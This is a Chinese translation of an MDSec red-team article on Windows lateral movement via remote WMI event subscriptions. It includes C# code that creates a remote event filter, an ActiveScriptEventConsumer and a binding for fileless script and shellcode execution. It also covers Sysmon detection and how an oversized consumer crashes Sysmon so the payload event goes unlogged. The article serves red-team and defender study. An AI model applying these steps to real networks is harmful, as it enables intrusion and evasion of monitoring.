# Windows横向移动全攻略（一）：WMI事件订阅

阅读量 **266704**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-07 15:30:58

 **x**

##### 译文声明

本文是翻译文章，文章原作者 Dominic Chell，文章来源：mdsec.co.uk

原文地址：<https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01c2c8d6e7093d16dd.jpg)

## 0x00 概述

在一个防御较为完善的Windows环境中，如果想实现横向移动，是非常具有挑战的事情，因为防御者会将许多常用的横向移动技术作为指标，进行有针对性的检测。这些指标可能包括Live
off the
land二进制文件（LOLBins）的执行、DLL/EXE/MSI的投放或执行、WMI的`Win32_Process.Create`或`Win32_Product.Install`方法。

在尝试使用Cobalt、Impacket或类似工具时，怎样去控制它们的威胁指标就成为了一个难题。作为红队成员，不仅需要了解有哪些可以使用的技术，还需要了解其功能，以及特定技术或工具可能产生的指标。

在去年，我发表过3篇文章，介绍了一些我最喜欢的持久化技术。在今年的这一系列文章中，我将分析我最喜欢的三种横向移动技巧，解释它们的工作原理，并站在防御者视角分析如何实现检测。首先，从WMI事件订阅开始说起。

## 0x01 WMI事件订阅的横向移动

在我的持久化技术系列文章的第3篇中，描述了如何将WMI事件订阅用于持久性。但是，这并不是事件订阅的唯一用法，尽管不太常见，但WMI事件订阅也可以远程部署，并用于横向移动。

与大多数横向移动技术一样，远程部署WMI事件订阅需要在远程系统上具有管理员权限，因此对于本文来说，我们假设大家已经获得了远程主机的特权。

我之所以非常喜欢这种技术，主要原因是它可以以无文件的形式实现。也就是说，无需借助任何工具，就可以到达目标的磁盘上，所以这种方式非常适用于防御较为完善的环境。

远程部署事件订阅与本地部署并没有太大区别，不同之处在于，前者必须配置`ManagementScope`的`ConnectionOptions`，将其设置为远程命名空间。可以使用C#来实现：

    
    
    string NAMESPACE = "\\\\\\\\" + Config.REMOTE_HOST + "\\\\root\\\\subscription";
    
    ConnectionOptions cOption = new ConnectionOptions();
    ManagementScope scope = null;
    scope = new ManagementScope(NAMESPACE, cOption);
    if (!String.IsNullOrEmpty(ACTIVE_DIRECTORY_USERNAME) && !String.IsNullOrEmpty(ACTIVE_DIRECTORY_PASSWORD))
    {
        scope.Options.Username = ACTIVE_DIRECTORY_USERNAME;
        scope.Options.Password = ACTIVE_DIRECTORY_PASSWORD;
        scope.Options.Authority = string.Format("ntlmdomain:{0}", ACTIVE_DIRECTORY_DOMAIN);
    }
    scope.Options.EnablePrivileges = true;
    scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
    scope.Options.Impersonation = ImpersonationLevel.Impersonate;
    

这里所需的组件与我们在持久化文章中描述的组件非常相似——事件（event）必须和消费者（consumer）绑定在一起。我在之前的文章中已经介绍了这些组件的用途，在这里再回顾一下：

1、事件筛选器（Event Filter）：WQL事件查询，用于将事件筛选为特定条件集，例如刚刚在终端上派生的Outlook.exe。WQL查询可能类似于：

    
    
    Select * From __InstanceCreationEvent Within 5 
    Where TargetInstance Isa “Win32_Process” AND TargetInstance.Name = "Outlook.exe"
    

2、事件消费者（Event
Consumer）：这是事件触发时我们想要进行的特定操作，从红队交付来看，我们感兴趣的两个类是`ActiveScriptEventConsumer`和`CommandLineEventConsumer`。其中，`ActiveScriptEventConsumer`允许执行脚本代码（来自JScript或VBScript引擎），而`CommandLineEventConsumer`类则允许运行任意命令。我个人比较倾向于`ActiveScriptEventConsumer`类，这样就可以避免触及LOLBin的雷区。

在考虑如何创建对横向移动有帮助的WMI事件过滤器时，我们需要一个查询，该查询会在不久的将来的某个时间节点自动触发，或者通过我们的动作自行触发。

最初的思路，是使用计时器（timer），我花费了一些时间料研究如何监视`Win32_LocalTime`和`Win32_UTCTime`类的更改，以便使用事件计时器。但遗憾的是，由于某些未知的原因，我无法可靠地完成这项工作，所以开始考虑能否基于一些可以可靠地控制的东西去实现事件过滤器。首先考虑监视特定进程的创建，可能导致WMIPrvSE.exe或类似的程序启动，从而导致触发筛选器。除此之外，还有另一种方法，就是监视`Win32_LogonSession`类，然后触发第二次认证。这一过程可以通过使用类似于以下内容的查询来实现：

    
    
    SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'
    

可以使用以下代码应用过滤器：

    
    
    ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
    WqlEventQuery myEventQuery = new WqlEventQuery(Config.eventQuery);
    myEventFilter = wmiEventFilter.CreateInstance();
    myEventFilter["Name"] = filterName;
    myEventFilter["Query"] = myEventQuery.QueryString;
    myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
    myEventFilter["EventNameSpace"] = @"\\root\\cimv2";
    myEventFilter.Put();
    

部署过滤器完成后，我们只需要使用前面所说的代码进行身份验证，等待信标，然后删除过滤器、消费者和绑定即可。当然，在这个比较短的时间内，有可能会进行合法身份验证，这样我们会收到两个信标。但在实际尝试过程中，还没有遇到这样的情况。

现在，我们能够可靠地捕获事件，接下来就需要应用事件消费者。为了保持无文件的状态，我通常会使用`ActiveScriptEventConsumer`类，可以通过C#来应用，类似于以下代码：

    
    
    myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
    Console.WriteLine("[*] Attempting to create ActiveScriptEventConsumer with name: " + scriptName);
    myEventConsumer["Name"] = scriptName;
    myEventConsumer["ScriptingEngine"] = "VBScript";
    myEventConsumer["ScriptText"] = vbscript;
    myEventConsumer.Put();
    

最后，需要将过滤器与消费者绑定在一起：

    
    
    myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
    myBinder["Filter"] = myEventFilter.Path.RelativePath;
    myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
    myBinder.Put();
    

我们可以考虑将事件名称、消费者名称与环境中已经存在的一些名称进行混合，因为考虑到例如SCCM这样的软件也会使用事件订阅。

我们可以使用GadgetToJScript，将我们熟悉的.NET加载程序转换为VBScript，这样应该能够可靠地获得任意的Shellcode执行。

在后续身份验证后，就可以使用`Delete()`方法清理过滤器、消费者和绑定：

    
    
    myEventFilter.Delete();
    myEventConsumer.Delete();
    myBinder.Delete();
    

通过下面的视频，我们可以看到是如何制作Cobalt Strike信标的：

<https://vimeo.com/453414838>

在我的示例中，`scrcons.exe`将从`svchost.exe`派生，并加载CLR：

![](https://p3.ssl.qhimg.com/t01f664edb854a39010.png)

当Payload注入到正在运行的进程（在示例中为`svchost.exe`）时，没有其他进程创建事件，并且`scrcons.exe`将在此后不久退出，几乎没有留下任何Payload执行的痕迹。

## 0x02 检测方法

现在，我们已经明确了这项技术的工作原理，以及如何利用它进行横向移动。我们接下来站在蓝队视角，去看看如何检测到潜在的滥用行为。

使用Sysmon，我们可以收集`WmiEventFilter`（ID 19）、`WmiEventConsumer`（ID
20）和`WmiEventConsumterToFilter`（ID 21）事件：

    
    
    <RuleGroup name="" groupRelation="or">
        <!-- Event ID 19,20,21, == WmiEvent. Log all WmiEventFilter, WmiEventConsumer, WmiEventConsumerToFilter activity-->
        <WmiEvent onmatch="exclude"/>
    </RuleGroup>
    

借助Blacksmith（由Cyb3rWard0g提供），我们就可以获得这些活动的详细信息：

![](https://p2.ssl.qhimg.com/t016a5bf080a034b507.png)

从上图可以看到，我们不仅能够看到使用的事件过滤器，还可以在事件ID 20中查看到执行的VBS，即使是在删除之后也是如此。

![](https://p3.ssl.qhimg.com/t01fccda04ee1b6eec8.png)

在上面的示例中，我们使用了一个简单的VBS脚本，在文件系统上创建一个文件。但是，当我使用真实的加载程序进行测试时，我发现事件ID
20没有被记录，在19和21之间缺少了事件20：

![](https://p5.ssl.qhimg.com/t017fb9ded7e001cce1.png)

在与Cyb3rWard0g进行反复研究之后，Cyb3rWard0g发现他可以重现这种情况。我最初认为，是由于VBS的大小（大约2MB）导致的，所以事件查看器中可能没有显示出这个事件。在Cyb3rWard0g的帮助下，我们通过PowerShell查看了日志，但很遗憾，这里也同样没有。

![](https://p4.ssl.qhimg.com/t010a719af18e72035a.png)

在进一步研究的过程中，我们很快就发现了丢失日志的根本原因。是因为较大的`WmiEventConsumer`导致了Sysmon的崩溃：

![](https://p3.ssl.qhimg.com/t014bc6dbea61759220.png)

我们可以在横向移动发生时，通过ProcessHacker观察执行过程，来确认这一点：

![](https://p4.ssl.qhimg.com/t018db587af73c6461b.png)

`Sysmon64.exe`最终会重新启动，但是由于我们触发的崩溃，确实也逃避了事件ID 20的日志记录，而这正是我们的Payload所在的位置。

如果大家想要重现这一技术，并观察检测结果，我目前正在与Cyb3rWard0g一起为Mordor项目生成数据集，该数据集可以在这里找到：
<https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-200724174200.html>
。

此外，Cyb3rWard0g也为防御者提供了一些参考信息，可以在这里找到：

<https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html>
。

## 0x03 总结

WMI事件订阅为横向移动提供了一种可行的途径，并且适用于防御较为完善的场景。这种技术规避了传统的命令行执行和利用特定文件的方式，来实现任意脚本执行。尽管可以通过特定的遥测技术来检测这种攻击方法，但由于Sysmon中具有的限制，可能无法检测到某些场景。

本文翻译自mdsec.co.uk [原文链接](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P!chu** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/216457](/post/id/216457)

安全客 - 有思想的安全新媒体

本文转载自: [mdsec.co.uk](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/)

如若转载,请注明出处： <https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [横向移动](/tag/横向移动)
  * [攻防演练](/tag/攻防演练)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

